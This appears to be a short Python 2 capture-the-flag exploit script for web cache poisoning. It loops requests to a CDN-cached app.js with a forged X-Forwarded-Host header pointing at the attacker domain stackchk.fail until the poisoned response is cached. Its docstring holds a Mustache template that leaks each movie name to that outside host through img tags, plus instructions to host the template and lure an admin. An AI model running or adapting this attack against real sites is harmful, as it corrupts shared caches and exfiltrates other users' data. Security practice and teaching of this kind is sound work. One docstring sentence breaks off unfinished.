import time
import requests

"""
Change the host below to what ever cdn you get for your ip.
Once this script finishes, have the admin visit

Put this file in /cdn/main.mst on your server, etc

<div>
<div id="captcha"></div>
</div>
<button id="report"></button>
{{#movies}}
<img src="http://stackchk.fail/{{name}}"/>
{{/movies}}
"""

while True:
    r = requests.get('http://1f8f5aca36d8114acf5de3651b2e1af5a507e264.cache2.stackchk.fail/cdn/app.js',
            headers={'X-Forwarded-Host':'stackchk.fail'}) # replace with your own domain
    for resp in r.history:
        print resp.status_code, resp.url
    if '//stackchk.fail' in r.text:
        print r.text
        break
    print r.headers
    age = int(r.headers['Age'])
    if age > 120:
        time.sleep(120)
    else:
        time.sleep(120.1-age)

